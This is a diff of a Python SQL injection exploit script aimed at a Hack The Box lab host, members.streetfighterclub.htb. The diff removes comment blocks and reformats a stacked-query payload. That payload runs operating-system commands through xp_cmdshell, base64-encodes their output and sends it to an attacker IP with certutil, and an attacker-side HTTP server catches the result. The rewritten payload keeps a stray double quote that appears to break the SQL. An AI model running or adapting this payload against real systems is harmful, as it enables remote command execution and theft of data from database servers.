@@ -11,9 +11,6 @@ Author: @xassiz
 Modified by: @s0j0hn
 '''
 query_id = 0
-'''
-Decoding functions
-'''
 
 
 def decode(data):
@@ -27,11 +24,6 @@ def decode(data):
     return decoded_data.decode('utf8', errors='ignore')
 
 
-'''
-Get command from stdin
-'''
-
-
 def get_command():
     try:
         cmd = input(':\> ')
@@ -41,22 +33,20 @@ def get_command():
         sys.exit(0)
 
 
-'''
-Create payload and send command: adapt this function to your needs
-'''
-
-
 def send_command(cmd):
     global target_url, local_url
 
-    payload = "2;"
-    payload += "declare @r varchar(6120),@cmdOutput varchar(6120);"
-    payload += "declare @res TABLE(line varchar(max));"
-    payload += "insert into @res exec Xp_cmdshell %s;"
-    payload += "set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path('')), 1, 1, '')) as varbinary(max)) FOR XML PATH(''), BINARY BASE64);"
-    payload += "set @r=concat('certutil -urlcache -f http://10.10.14.24/',@cmdOutput);"
-    payload += "exec Xp_cmdshell @r;"
-    payload += "--"
+    payload = '''
+    2;
+    declare @r varchar(6120),@cmdOutput varchar(6120);
+    declare @res TABLE(line varchar(max));
+    insert into @res exec Xp_cmdshell %s;
+    set @cmdOutput=(SELECT CAST((select stuff((select cast(char(10) as varchar(max)) + line FROM @res for xml path('')),
+     1, 1, '')) as varbinary(max)) FOR XML PATH(''), BINARY BASE64);"
+    set @r=concat('certutil -urlcache -f http://10.10.14.24/',@cmdOutput);
+    exec Xp_cmdshell @r;
+    --
+    '''
 
     # Data for login
     login = {
@@ -69,11 +59,6 @@ def send_command(cmd):
     }
 
     requests.post("http://members.streetfighterclub.htb/old/verify.asp", data=login)
-
-
-'''
-Custom HTTPServer
-'''
 
 
 class MyServer(HTTPServer):
@@ -108,9 +93,6 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         query_id += 1
 
 
-'''
-Main
-'''
 if __name__ == '__main__':
     # Fake server behaviour
     handler = SimpleHTTPRequestHandler
